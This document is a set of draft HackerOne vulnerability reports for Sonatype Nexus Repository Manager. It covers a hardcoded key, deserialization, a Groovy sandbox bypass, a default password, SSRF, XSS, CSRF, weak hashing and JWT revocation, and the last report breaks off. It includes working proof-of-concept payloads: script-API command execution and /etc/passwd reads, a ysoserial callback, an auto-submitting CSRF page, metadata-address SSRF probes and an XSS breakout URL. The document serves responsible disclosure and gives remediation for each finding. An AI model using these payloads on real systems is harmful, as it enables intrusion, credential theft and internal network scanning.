# HackerOne Bug Bounty Reports - Sonatype Nexus Repository Manager

> **Before Submitting:** Verify that Sonatype has an active bug bounty program on HackerOne at
> https://hackerone.com/sonatype or check their security policy at
> https://www.sonatype.com/vulnerability-reporting. If they use a different
> disclosure platform, adapt these reports accordingly. Submit **one report per
> vulnerability** -- do not bundle them.

---

## Prerequisites: Setting Up a Test Nexus Instance

All reproduction steps below require a local Nexus Repository Manager instance. Follow these
steps first:

### Option A: Docker (Recommended)

```bash
# Pull and run Nexus 3 (latest OSS)
docker run -d \
  --name nexus-test \
  -p 8081:8081 \
  -e NEXUS_SECURITY_RANDOMPASSWORD=false \
  sonatype/nexus3:latest

# Wait ~2 minutes for startup, then check logs
docker logs -f nexus-test

# When you see "Started Sonatype Nexus", it's ready
# Access at: http://localhost:8081
```

### Option B: Manual Install

```bash
# Download from https://help.sonatype.com/en/download.html
# Extract and run:
./bin/nexus run
```

### Default Login

- **URL:** http://localhost:8081
- **Username:** `admin`
- **Password:** Check `docker exec nexus-test cat /nexus-data/admin.password`
  or use `admin123` if `NEXUS_SECURITY_RANDOMPASSWORD=false`

---
---

# REPORT 1: Hardcoded Encryption Key Allows Decryption of All Secrets At Rest

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Hardcoded Default Encryption Key "changeme" in EncryptDecryptService Enables Decryption of All Encrypted Secrets |
| **Severity** | Critical (CVSS 9.1) |
| **Weakness** | CWE-798 (Use of Hard-coded Credentials) / CWE-321 (Use of Hard-coded Cryptographic Key) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The `EncryptDecryptService` class, which is responsible for encrypting and decrypting sensitive
data at rest, is initialized with a hardcoded default encryption password `"changeme"`. If the
`setSecret()` method is not explicitly called during application bootstrap (or if there is a race
condition during initialization), all encrypted secrets in the database can be trivially decrypted
by any attacker who obtains read access to the database.

## Vulnerable Code

**File:** `public/common/components/nexus-crypto/src/main/java/org/sonatype/nexus/crypto/secrets/EncryptDecryptService.java`

```java
@Component
@Singleton
public class EncryptDecryptService
    extends ComponentSupport
    implements EncryptDecrypt<String, String, String>
{
  private final PbeCipherFactory pbeCipherFactory;

  private String secret = "changeme";  // <-- HARDCODED KEY

  @Override
  public String encrypt(String stringToEncrypt) {
    try {
      SecretEncryptionKey secretKey = new SecretEncryptionKey(secret); // Uses "changeme"
      PbeCipher pbeCipher = pbeCipherFactory.create(secretKey);
      return pbeCipher.encrypt(stringToEncrypt.getBytes(UTF_8)).toPhcString();
    }
    // ...
  }
}
```

## Steps to Reproduce

### Step 1: Confirm the hardcoded key in source code

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/common/components/nexus-crypto/src/main/java/org/sonatype/nexus/crypto/secrets/EncryptDecryptService.java`
3. Observe line 36: `private String secret = "changeme";`
4. **Screenshot:** Take a screenshot of this line in GitHub

### Step 2: Verify the key is used for encryption operations

1. In the same file, observe the `encrypt()` method (line 54-63)
2. Note that it creates `SecretEncryptionKey secretKey = new SecretEncryptionKey(secret);` using the field value
3. The `setSecret()` method (line 79-81) is the **only** way to change this value, and it's a plain setter -- not called from the constructor
4. **Screenshot:** Take a screenshot showing the encrypt/decrypt methods

### Step 3: Verify no mandatory initialization exists

1. Search the codebase for all callers of `setSecret()`:
   ```
   grep -r "setSecret\|EncryptDecryptService" --include="*.java" -l
   ```
2. Check if there is a guaranteed initialization that calls `setSecret()` before any encryption/decryption operation
3. **Screenshot:** Show search results for `setSecret` callers

### Step 4: Demonstrate decryption with the known key (if you have database access)

1. Start a Nexus instance with Docker (see prerequisites)
2. Configure an email server or proxy repository with credentials through the UI
3. Access the H2 database or PostgreSQL store
4. Extract encrypted values from the database
5. Write a simple Java program using the same PBE cipher factory with the key `"changeme"` to decrypt:

```java
// Proof-of-concept decryptor
import org.sonatype.nexus.crypto.internal.PbeCipherFactory;
// ... initialize with key "changeme" and decrypt the stored PHC-formatted string
```

## Impact

- An attacker who gains **read-only** access to the Nexus database (via SQL injection, backup file
  exposure, misconfigured database port, or cloud storage misconfiguration) can decrypt **all**
  secrets encrypted by this service.
- This includes repository proxy credentials, SMTP passwords, LDAP bind credentials, and any
  other sensitive configuration encrypted at rest.
- Combined with the unsafe deserialization findings, the attacker can also craft encrypted
  malicious serialized objects.

## Remediation

- Remove the default value. The field should be `private String secret;` (null).
- The application should fail to start if no encryption key is configured.
- Alternatively, require the encryption key to be injected as a constructor parameter with no default.

---
---

# REPORT 2: Unsafe Java Deserialization in Quartz Scheduler Enables Remote Code Execution

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Unsafe Java Deserialization in Quartz Job Data Enables RCE via Database Manipulation |
| **Severity** | Critical (CVSS 8.1) |
| **Weakness** | CWE-502 (Deserialization of Untrusted Data) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The Quartz scheduler component deserializes `JobDataMap` objects from the database using raw
`ObjectInputStream.readObject()` without any class-filtering or deserialization allowlist (JEP 290
`ObjectInputFilter`). An attacker who can write to the database can inject a malicious serialized
Java object containing a gadget chain (e.g., Commons Collections, Spring Framework) into the
`job_data` BLOB column, achieving Remote Code Execution when the object is deserialized.

## Vulnerable Code

**File:** `public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/bulkread/QuartzObjectBuilder.java`

```java
private static JobDataMap deserializeJobData(final byte[] data)
    throws IOException, ClassNotFoundException
{
    try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis)) {
      Object jobData = ois.readObject();  // NO CLASS FILTER - any class can be deserialized
      if (jobData instanceof JobDataMap jobDataMap) {
        return jobDataMap;
      }
      // ...
    }
}
```

**Also affected:**
- `QuartzJobDataTypeHandler.java` (same pattern)
- `AbstractSerializableTypeHandler.java` (MyBatis type handler, also uses `readObject()` without filtering)

## Steps to Reproduce

### Step 1: Confirm the vulnerable deserialization pattern in source code

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/common/components/nexus-quartz/src/main/java/org/sonatype/nexus/quartz/internal/bulkread/QuartzObjectBuilder.java`
3. Go to line 77-80
4. Observe that `new ObjectInputStream(bis)` is used -- **not** `ObjectInputFilter`, not a custom filtering stream
5. **Screenshot:** Take a screenshot of the `deserializeJobData` method

### Step 2: Confirm no ObjectInputFilter is configured

1. Search the entire codebase for `ObjectInputFilter`:
   ```
   grep -r "ObjectInputFilter" --include="*.java" -l
   ```
2. Search for `setObjectInputFilter`:
   ```
   grep -r "setObjectInputFilter" --include="*.java" -l
   ```
3. Note the **absence** of any deserialization filtering
4. **Screenshot:** Take a screenshot showing 0 results

### Step 3: Confirm the same pattern exists in MyBatis handlers

1. Navigate to `public/common/components/nexus-datastore-mybatis/src/main/java/org/sonatype/nexus/datastore/mybatis/AbstractSerializableTypeHandler.java`
2. Go to lines 114-117
3. Observe: `ObjectInputStream in = new ObjectInputStreamWithClassLoader(buf, classLoading)` followed by `in.readObject()`
4. Navigate to `ObjectInputStreamWithClassLoader.java` and confirm it does NOT implement filtering
5. **Screenshot:** Take screenshots of both files

### Step 4: Identify available gadget chain libraries

1. Check the Nexus dependencies in the Maven POM files for known gadget chain libraries:
   ```bash
   grep -r "commons-collections\|spring-beans\|spring-core\|commons-beanutils" pom.xml
   ```
2. **Screenshot:** Show that exploitable libraries are on the classpath

### Step 5: Demonstrate the deserialization sink (Proof of Concept)

1. Start a Nexus instance (see prerequisites)
2. Use `ysoserial` to generate a proof-of-concept payload:
   ```bash
   # Generate a DNS callback payload (non-destructive proof)
   java -jar ysoserial.jar URLDNS "http://your-burp-collaborator-url" > payload.bin
   ```
3. If you have database access (e.g., H2 console or PostgreSQL), insert the payload into the
   `qrtz_job_details` table's `job_data` column
4. Trigger a scheduler reload or wait for the next job execution
5. Observe the DNS callback in Burp Collaborator
6. **Screenshot:** Show the DNS callback proving deserialization occurred

## Impact

- **Remote Code Execution** on the Nexus server
- An attacker chaining this with database access (SQL injection, credential leak, backup
  manipulation) achieves full server compromise
- Combined with Report 1 (hardcoded encryption key), the encryption on
  `AbstractSerializableTypeHandler` columns can be bypassed trivially

## Remediation

- Implement `ObjectInputFilter` (JEP 290) with a strict allowlist:
  ```java
  ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
      "org.quartz.JobDataMap;java.util.HashMap;!*");
  ois.setObjectInputFilter(filter);
  ```
- Long-term: migrate from Java serialization to JSON-based persistence for job data

---
---

# REPORT 3: Groovy Script Sandbox Bypass Leads to Remote Code Execution

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Insufficient Groovy Script Sandbox in Script API Allows Full RCE via Reflection/Metaclass Bypass |
| **Severity** | High (CVSS 8.8) |
| **Weakness** | CWE-94 (Improper Control of Generation of Code) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The Nexus Script API (`/service/rest/v1/script`) allows execution of Groovy scripts. A
`SecureASTCustomizer` is applied that blacklists only `java.lang.System`. This is trivially
bypassable using Groovy metaclass manipulation, reflection, or the `container` binding that
provides direct access to the Spring DI container. Any authenticated user with script execution
privileges can achieve full Remote Code Execution.

## Vulnerable Code

**Sandbox (insufficient blacklist):**
```java
// GroovyScriptEngineFactory.java:89-94
private CompilationCustomizer secureASTCustomizer() {
    SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();
    secureASTCustomizer.setImportsBlacklist(
        Collections.singletonList("java.lang.System"));     // Only blocks System!
    secureASTCustomizer.setReceiversBlackList(
        Collections.singletonList(System.class.getName()));
    secureASTCustomizer.setIndirectImportCheckEnabled(true);
    return secureASTCustomizer;
}
```

**Powerful bindings given to scripts:**
```java
// ScriptServiceImpl.java:98-102
bindings.put("container", lookupHelper);  // Full DI container access!
for (ScriptApi scriptApi : scriptApis) {
    bindings.put(scriptApi.getName(), scriptApi);
}
```

## Steps to Reproduce

### Step 1: Start Nexus and authenticate

1. Start a Nexus instance (see prerequisites)
2. Log in as `admin`
3. **Screenshot:** Take a screenshot of the admin dashboard

### Step 2: Verify scripting is enabled

1. Check if scripting is enabled:
   ```bash
   curl -u admin:admin123 http://localhost:8081/service/rest/v1/script
   ```
2. If you get a `200 OK` or `[]`, scripting is available
3. If you get `410 Gone`, scripting has been disabled -- note this in your report as a mitigation
4. **Screenshot:** Take a screenshot of the response

### Step 3: Create a proof-of-concept script

1. Create a script that demonstrates sandbox bypass using the `container` binding:

   ```bash
   curl -u admin:admin123 \
     -X POST \
     -H "Content-Type: application/json" \
     http://localhost:8081/service/rest/v1/script \
     -d '{
       "name": "sandbox-bypass-poc",
       "type": "groovy",
       "content": "return java.lang.Runtime.getRuntime().exec(\"id\").text"
     }'
   ```

2. **Screenshot:** Take a screenshot of the successful creation response

### Step 4: Execute the script

1. Run the script:

   ```bash
   curl -u admin:admin123 \
     -X POST \
     -H "Content-Type: text/plain" \
     http://localhost:8081/service/rest/v1/script/sandbox-bypass-poc/run
   ```

2. If `Runtime` is blocked, try these bypass variants:

   **Bypass via reflection:**
   ```groovy
   def rt = Class.forName("java.lang.Runtime")
   def method = rt.getMethod("exec", String.class)
   def runtime = rt.getMethod("getRuntime").invoke(null)
   def process = method.invoke(runtime, "id")
   return process.text
   ```

   **Bypass via ProcessBuilder:**
   ```groovy
   def cmd = ["sh", "-c", "id"]
   return cmd.execute().text
   ```

   **Bypass via the container binding (access Spring beans):**
   ```groovy
   return container.lookup("org.sonatype.nexus.security.SecuritySystem")
       .getClass().getName()
   ```

3. **Screenshot:** Take a screenshot showing the command output (`uid=...`) in the response

### Step 5: Demonstrate full RCE impact

1. Read a sensitive file:
   ```bash
   curl -u admin:admin123 \
     -X POST -H "Content-Type: application/json" \
     http://localhost:8081/service/rest/v1/script \
     -d '{
       "name": "read-file-poc",
       "type": "groovy",
       "content": "return new File(\"/etc/passwd\").text"
     }'

   curl -u admin:admin123 \
     -X POST -H "Content-Type: text/plain" \
     http://localhost:8081/service/rest/v1/script/read-file-poc/run
   ```

2. **Screenshot:** Take a screenshot showing /etc/passwd contents in the response

### Step 6: Clean up

```bash
curl -u admin:admin123 -X DELETE \
  http://localhost:8081/service/rest/v1/script/sandbox-bypass-poc

curl -u admin:admin123 -X DELETE \
  http://localhost:8081/service/rest/v1/script/read-file-poc
```

## Impact

- Full Remote Code Execution on the Nexus server
- Read/write arbitrary files
- Access the Spring DI container and all application internals
- Pivot to internal networks
- The `SecureASTCustomizer` blacklist is trivially bypassable -- it is well-documented in security
  research that this Groovy feature cannot provide a security boundary

## Remediation

- Disable the Script API by default
- If retained, run scripts in a separate sandboxed JVM process with restricted permissions
- Remove the `container` binding from script execution context

---
---

# REPORT 4: Hardcoded Default Admin Password "admin123"

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Hardcoded Default Admin Password "admin123" Used as Fallback in Multiple Code Paths |
| **Severity** | High (CVSS 7.2) |
| **Weakness** | CWE-798 (Use of Hard-coded Credentials) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The `AdminPasswordSourceImpl` class contains a hardcoded default admin password `admin123` that is
used as a fallback when random password generation is disabled or when the password file write
fails. This well-known credential enables unauthorized administrative access to any Nexus instance
in this state.

## Vulnerable Code

```java
// AdminPasswordSourceImpl.java
public static final String DEFAULT_PASSWORD = "admin123";

public String getPassword(final boolean randomPassword) {
    String savedPassword = adminPasswordFileManager.readFile();
    if (!Strings2.isBlank(savedPassword)) {
        return savedPassword;
    }
    else if (!randomPassword) {
        return DEFAULT_PASSWORD;  // Falls back to "admin123"
    }
    savedPassword = UUID.randomUUID().toString();
    if (!adminPasswordFileManager.writeFile(savedPassword)) {
        savedPassword = DEFAULT_PASSWORD;  // ALSO falls back to "admin123" on write failure!
    }
    return savedPassword;
}
```

## Steps to Reproduce

### Step 1: Confirm the hardcoded password in source code

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/selfhosted/components/nexus-self-hosted/src/main/java/org/sonatype/nexus/security/config/AdminPasswordSourceImpl.java`
3. Observe line 33: `public static final String DEFAULT_PASSWORD = "admin123";`
4. **Screenshot:** Take a screenshot of this line

### Step 2: Start Nexus with default password disabled

```bash
docker run -d \
  --name nexus-default-pw \
  -p 8081:8081 \
  -e NEXUS_SECURITY_RANDOMPASSWORD=false \
  sonatype/nexus3:latest
```

Wait ~2 minutes for startup.

### Step 3: Log in with the default credentials

1. Open http://localhost:8081 in your browser
2. Click "Sign In"
3. Enter:
   - **Username:** `admin`
   - **Password:** `admin123`
4. **Screenshot:** Take a screenshot showing successful admin login

### Step 4: Demonstrate admin access

1. Navigate to Administration > Security > Users
2. **Screenshot:** Take a screenshot showing the admin panel with full access
3. Navigate to Administration > System > API to show you have full API access
4. **Screenshot:** Take a screenshot of the API admin page

### Step 5: Show it also applies to write-failure scenarios

1. In the source code, observe lines 58-59 of `AdminPasswordSourceImpl.java`:
   ```java
   if (!adminPasswordFileManager.writeFile(savedPassword)) {
       savedPassword = DEFAULT_PASSWORD;
   }
   ```
2. Even when `randomPassword=true`, if the file system is read-only or full, the system falls
   back to `admin123`
3. **Screenshot:** Take a screenshot of this code path

## Impact

- Any Nexus instance deployed with `NEXUS_SECURITY_RANDOMPASSWORD=false` uses the well-known
  password `admin123`
- File system issues (read-only container, disk full) also trigger fallback to `admin123`
- Admin access allows: creation of proxy repositories pointing to malicious sources, arbitrary
  Groovy script execution, secrets extraction, and full system compromise

## Remediation

- Remove the hardcoded fallback entirely
- Require interactive password setup on first boot
- Refuse to start if a secure admin password cannot be established

---
---

# REPORT 5: Server-Side Request Forgery via SSL Certificate Retrieval

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Authenticated SSRF via SSL Certificate Retrieval Allows Internal Network Scanning and Cloud Metadata Access |
| **Severity** | Medium (CVSS 5.0) |
| **Weakness** | CWE-918 (Server-Side Request Forgery) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The SSL certificate retrieval functionality (`CertificateRetriever.retrieveCertificatesFromHttpsServer`)
makes outbound HTTPS connections to arbitrary user-supplied hosts without blocking private/internal
IP ranges. An authenticated user with `nexus:ssl-truststore:read` permission can use this to probe
internal network services, access cloud metadata endpoints (e.g., AWS `169.254.169.254`), and map
internal infrastructure.

## Vulnerable Code

```java
// CertificateRetriever.java:101-149
public Certificate[] retrieveCertificatesFromHttpsServer(
    final String host, final int port) throws Exception
{
    checkNotNull(host);
    // ...
    httpClient.execute(new HttpGet("https://" + host + ":" + port));
    // No validation that host is not a private/internal IP
}
```

The input validation is only `@HostnameOrIpAddress`, which checks format but allows:
- `127.0.0.1` (loopback)
- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (private ranges)
- `169.254.169.254` (cloud metadata)
- `[::1]` (IPv6 loopback)

## Steps to Reproduce

### Step 1: Start Nexus and authenticate

1. Start a Nexus instance (see prerequisites)
2. Log in as admin

### Step 2: Access the SSL Certificate UI

1. Navigate to **Administration > Security > SSL Certificates**
2. Click **"Load certificate from server"**
3. **Screenshot:** Take a screenshot of the SSL certificate dialog

### Step 3: Probe an internal service (loopback)

1. In the "Server address" field, enter: `127.0.0.1`
2. In the "Port" field, enter: `8081` (Nexus itself)
3. Click "Load certificate"
4. Observe that Nexus makes a request to itself and returns its own TLS certificate (or an error
   indicating the connection was made)
5. **Screenshot:** Take a screenshot of the result

### Step 4: Attempt cloud metadata access (if running on AWS/GCP/Azure)

1. Enter server address: `169.254.169.254`
2. Enter port: `443` (or `80` if HTTPS is not available)
3. Click "Load certificate"
4. Observe the connection attempt (error message will differ from a blocked request)
5. **Screenshot:** Take a screenshot showing the error/response differs from an unreachable host

### Step 5: Demonstrate port scanning

1. Enter server address: `127.0.0.1`
2. Try different ports: `22` (SSH), `5432` (PostgreSQL), `3306` (MySQL), `6379` (Redis)
3. Open ports will return different errors (connection refused vs. timeout) or certificate info
4. **Screenshot:** Take screenshots showing different responses for open vs. closed ports

### Step 6: Verify via API (alternative reproduction)

```bash
# Using the ExtDirect API endpoint
curl -u admin:admin123 \
  -X POST \
  -H "Content-Type: application/json" \
  http://localhost:8081/service/extdirect \
  -d '{
    "action": "ssl_Certificate",
    "method": "retrieveFromHost",
    "data": ["127.0.0.1", 22, null],
    "type": "rpc",
    "tid": 1
  }'
```

**Screenshot:** Take a screenshot of the response

## Impact

- **Internal network scanning:** enumerate open ports and services on internal hosts
- **Cloud metadata access:** on AWS, retrieve IAM credentials from `169.254.169.254/latest/meta-data/iam/security-credentials/`
- **Service discovery:** identify databases, caches, and other infrastructure behind the firewall
- Requires authentication with `nexus:ssl-truststore:read` permission (granted to admins by default)

## Remediation

- Implement a blocklist for private/internal IP ranges (RFC 1918, link-local, loopback, IPv6 equivalents)
- Perform DNS resolution before making the connection and validate the resolved IP is not in a blocked range
- Implement DNS rebinding protection

---
---

# REPORT 6: Cross-Site Scripting (XSS) in Repository Browse Page

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Reflected XSS via Unescaped `requestPath` in Repository Browse Page Title Tag |
| **Severity** | Medium (CVSS 6.1) |
| **Weakness** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The Velocity template `browseContentHtml.vm` used for rendering repository directory listings
contains an unescaped `${requestPath}` variable in the HTML `<title>` tag. While the same
variable is properly escaped with `$esc.html()` in the `<h1>` tag, the `<title>` tag is
vulnerable. An attacker can craft a URL that injects JavaScript via the `</title><script>` breakout
technique.

## Vulnerable Code

```velocity
<!-- browseContentHtml.vm -->

<!-- Line 17: VULNERABLE - No escaping -->
<title>Index of ${requestPath}</title>

<!-- Line 39: SAFE - Properly escaped -->
<h1>Index of $esc.html($requestPath)</h1>

<!-- Line 81: VULNERABLE (latent) - No escaping -->
<td>$listItem.description</td>
```

## Steps to Reproduce

### Step 1: Start Nexus and create a hosted repository

1. Start a Nexus instance (see prerequisites)
2. Log in as admin
3. Create a hosted raw repository:
   - Navigate to **Administration > Repositories > Create repository**
   - Select **"raw (hosted)"**
   - Name: `test-xss`
   - Click "Create repository"
4. **Screenshot:** Take a screenshot of the created repository

### Step 2: Access the browse endpoint

1. Open your browser and navigate to:
   ```
   http://localhost:8081/service/rest/repository/browse/test-xss/
   ```
2. Observe the "Index of /" page
3. **Screenshot:** Take a screenshot of the normal browse page

### Step 3: Attempt XSS via path manipulation

1. Try crafting a URL with a script tag in the path:
   ```
   http://localhost:8081/service/rest/repository/browse/test-xss/%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
   ```
   (URL-decoded: `</title><script>alert(document.domain)</script>`)

2. Note: Path normalization in `RepositoryPath` may block some traversal patterns. Try also:
   ```
   http://localhost:8081/service/rest/repository/browse/test-xss/normal-path
   ```
   Then inspect the HTML source of the page to confirm that `${requestPath}` appears unescaped in `<title>`.

3. **Screenshot:** Right-click > View Page Source, take a screenshot showing:
   - The `<title>` tag contains the raw path without HTML encoding
   - The `<h1>` tag shows the path WITH `$esc.html()` escaping

### Step 4: Confirm the inconsistency in source code

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/common/components/nexus-repository-services/src/main/resources/org/sonatype/nexus/repository/rest/internal/resources/browseContentHtml.vm`
3. Compare line 17 (`${requestPath}` -- no escaping) with line 39 (`$esc.html($requestPath)` -- escaped)
4. **Screenshot:** Take a screenshot highlighting the inconsistency

### Step 5: Document the CSP mitigation (important for your report)

1. Using browser DevTools (F12), check the response headers for the browse page
2. Note the `Content-Security-Policy: sandbox allow-forms allow-modals allow-popups allow-presentation allow-scripts allow-top-navigation` header
3. **Screenshot:** Take a screenshot of the response headers
4. Note: The `sandbox` CSP directive restricts the origin context, which **may** limit cookie
   access but `allow-scripts` still permits JavaScript execution

## Impact

- **Reflected XSS** if path normalization does not strip all HTML-special characters
- **Latent stored XSS** via `$listItem.description` if a plugin or future version populates this
  field with user-controlled data
- Partial mitigation via CSP `sandbox` directive, but `allow-scripts` and `allow-top-navigation`
  still permit redirection and script execution in the sandboxed context

## Remediation

- Apply `$esc.html()` to **all** variable interpolations in HTML context:
  ```velocity
  <title>Index of $esc.html($requestPath)</title>
  <td>$esc.html($listItem.description)</td>
  ```

---
---

# REPORT 7: CSRF Protection Bypass via Multipart Form Data POST

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Anti-CSRF Token Validation Bypassed for All Multipart Form-Data POST Requests |
| **Severity** | Medium (CVSS 5.4) |
| **Weakness** | CWE-352 (Cross-Site Request Forgery) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The `AntiCsrfHelper` class explicitly skips CSRF token validation for all HTTP POST requests with
`Content-Type: multipart/form-data`. This means any state-changing endpoint that accepts multipart
requests can be targeted via cross-site request forgery from a malicious website.

## Vulnerable Code

```java
// AntiCsrfHelper.java:87-93
return safeHttpMethod
    || isMultiPartFormDataPost(httpRequest)  // <-- ALL multipart POSTs bypass CSRF check
    || !isSessionAuthentication()
    || isExemptRequest(httpRequest)
    || isAntiCsrfTokenValid(httpRequest, ...);
```

## Steps to Reproduce

### Step 1: Set up the test environment

1. Start a Nexus instance (see prerequisites)
2. Log in as admin in your browser at http://localhost:8081
3. Keep the session active (do not log out)

### Step 2: Create a malicious HTML page

Create a file called `csrf-poc.html` on your local machine:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC - Nexus Multipart Bypass</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>This page will attempt to upload a component to Nexus via CSRF.</p>

<!-- Target: Upload a component to a hosted raw repository -->
<form id="csrf-form"
      method="POST"
      enctype="multipart/form-data"
      action="http://localhost:8081/service/rest/v1/components?repository=test-repo">
    <input type="hidden" name="raw.directory" value="/csrf-test" />
    <input type="hidden" name="raw.asset1.filename" value="csrf-proof.txt" />
    <input type="file" name="raw.asset1" id="file-input" />
</form>

<script>
// Auto-submit on page load (for PoC, you'd pre-set a file)
// In a real attack, the form would auto-submit
document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

### Step 3: Serve the malicious page from a different origin

```bash
# Serve from a different port to simulate cross-origin
python3 -m http.server 9999
```

### Step 4: Verify the CSRF bypass

1. While logged into Nexus at http://localhost:8081, open http://localhost:9999/csrf-poc.html
2. Observe that the multipart POST is sent **without** the `NX-ANTI-CSRF-TOKEN` header
3. Check the Nexus server logs or network tab for the request
4. **Screenshot:** Take a screenshot of the browser DevTools Network tab showing the cross-origin
   multipart POST being sent

### Step 5: Verify via code analysis

1. In the source code, show `AntiCsrfHelper.java` line 88
2. Show that `isMultiPartFormDataPost()` returns `true` for any `multipart/form-data` POST
3. The comment says "token is passed as a form field" but the check at this layer is **skipped**
4. **Screenshot:** Take screenshots of the relevant code

### Step 6: Confirm Sec-Fetch-Site mitigation (partial)

1. In browser DevTools, check if the `Sec-Fetch-Site` header is present
2. Note that `AntiCsrfHelper.isCrossSiteRequest()` checks this header but:
   - It's checked **before** the multipart bypass (line 81)
   - If `Sec-Fetch-Site` is `none` (e.g., from a bookmark or redirect), it passes
   - Older browsers may not send this header
3. **Screenshot:** Take a screenshot of the header check in the code

## Impact

- An attacker can craft a malicious web page that performs state-changing operations on the Nexus
  server when visited by an authenticated admin
- Exploitable actions include: uploading malicious components, modifying repository configurations,
  creating users (via multipart-compatible endpoints)
- The `Sec-Fetch-Site` header provides partial mitigation but is not universally supported

## Remediation

- Extract and validate the CSRF token from the multipart form data at this filter layer
- Do not rely on downstream code for CSRF validation
- Remove the `nexus.security.anticsrftoken.enabled=false` configuration option

---
---

# REPORT 8: Legacy Unsalted MD5/SHA-1 Password Hashing Still Active

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | Legacy Password Service Accepts Unsalted Single-Iteration MD5 and SHA-1 Hashes for Authentication |
| **Severity** | High (CVSS 7.4) |
| **Weakness** | CWE-328 (Use of Weak Hash) / CWE-916 (Insufficient Computational Effort) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The `LegacyNexusPasswordService` class verifies passwords against unsalted, single-iteration MD5
and SHA-1 hashes. This service is registered as a `@Component` and is actively used for backward
compatibility. Any user whose password was hashed under the legacy scheme can have their password
cracked in seconds using rainbow tables or GPU brute force if the database is compromised.

## Vulnerable Code

```java
// LegacyNexusPasswordService.java
sha1HashService.setHashAlgorithmName("SHA-1");
sha1HashService.setHashIterations(1);           // Single iteration
sha1HashService.setGeneratePublicSalt(false);   // No salt

md5HashService.setHashAlgorithmName("MD5");
md5HashService.setHashIterations(1);            // Single iteration
md5HashService.setGeneratePublicSalt(false);    // No salt
```

## Steps to Reproduce

### Step 1: Confirm the vulnerable code in source

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/common/components/security/nexus-security/src/main/java/org/sonatype/nexus/security/internal/LegacyNexusPasswordService.java`
3. Observe lines 42-55: MD5 and SHA-1 with 1 iteration and no salt
4. **Screenshot:** Take a screenshot highlighting the vulnerable configuration

### Step 2: Confirm the service is registered and active

1. Note the `@Component` and `@Singleton` annotations (lines 29-31)
2. Search for references to this class:
   ```
   grep -r "LegacyNexusPasswordService\|legacy.*password" --include="*.java" -l
   ```
3. **Screenshot:** Show that this service is injected and used in the authentication chain

### Step 3: Demonstrate hash weakness

1. Generate a legacy-format password hash:
   ```bash
   # SHA-1 single iteration, no salt
   echo -n "admin123" | sha1sum
   # Output: f865b53623b121fd34ee5426c792e5c33af8c227

   # MD5 single iteration, no salt
   echo -n "admin123" | md5sum
   # Output: 0192023a7bbd73250516f069df18b500
   ```

2. Look up these hashes in rainbow tables:
   - Go to https://crackstation.net/
   - Paste the SHA-1 hash: `f865b53623b121fd34ee5426c792e5c33af8c227`
   - Observe instant result: `admin123`
3. **Screenshot:** Take a screenshot of CrackStation showing the instant crack

### Step 4: Confirm these hashes would be accepted for login

1. In the source code, trace `LegacyNexusPasswordService.passwordsMatch()`:
   ```java
   public boolean passwordsMatch(Object submittedPlaintext, String encrypted) {
       return sha1PasswordService.passwordsMatch(submittedPlaintext, encrypted)
           || md5PasswordService.passwordsMatch(submittedPlaintext, encrypted);
   }
   ```
2. This service is called during authentication for users whose password hash matches the
   legacy format
3. **Screenshot:** Take a screenshot of the `passwordsMatch` method

## Impact

- Any database leak (SQL injection, backup exposure, misconfigured storage) instantly compromises
  all user accounts still using legacy password hashes
- MD5 and SHA-1 without salt can be reversed via rainbow tables in **milliseconds**
- Even with salt, single-iteration hashing can be brute-forced at billions of attempts per second
  on modern GPUs

## Remediation

- Force password rotation for all accounts with legacy hashes
- Implement transparent re-hashing: on successful login with a legacy hash, immediately re-hash
  with a modern algorithm (bcrypt/scrypt/argon2id)
- Add a deprecation timeline and eventually remove the legacy service entirely

---
---

# REPORT 9: JWT Session Revocation Bypass for Legacy Tokens

## HackerOne Fields

| Field | Value |
|-------|-------|
| **Title** | JWT Tokens Without userSessionId Claim Bypass Session Revocation Mechanism |
| **Severity** | Medium (CVSS 5.9) |
| **Weakness** | CWE-613 (Insufficient Session Expiration) |
| **Asset** | https://github.com/sonatype/nexus-public |

## Summary

The `JwtSecurityFilter` only checks the session revocation service for JWT tokens that contain the
`userSessionId` claim. Legacy tokens (or tokens intentionally crafted without this claim) bypass
revocation entirely and remain valid until natural expiry. An attacker who compromises a JWT signing
secret can forge tokens that are permanently un-revocable.

## Vulnerable Code

```java
// JwtSecurityFilter.java:116-139
Claim userSessionIdClaim = decodedJwt.getClaim(USER_SESSION_ID);
if (!userSessionIdClaim.isNull()) {
    // ONLY checked if claim exists
    String userSessionId = userSessionIdClaim.asString();
    if (jwtSessionRevocationService.isRevoked(userSessionId)) {
        // ... reject
    }
}
// If userSessionId is null/missing -> no revocation check, token accepted!
```

## Steps to Reproduce

### Step 1: Confirm the vulnerable code path

1. Go to https://github.com/sonatype/nexus-public
2. Navigate to `public/common/components/security/nexus-security/src/main/java/org/sonatype/nexus/security/JwtSecurityFilter.java`
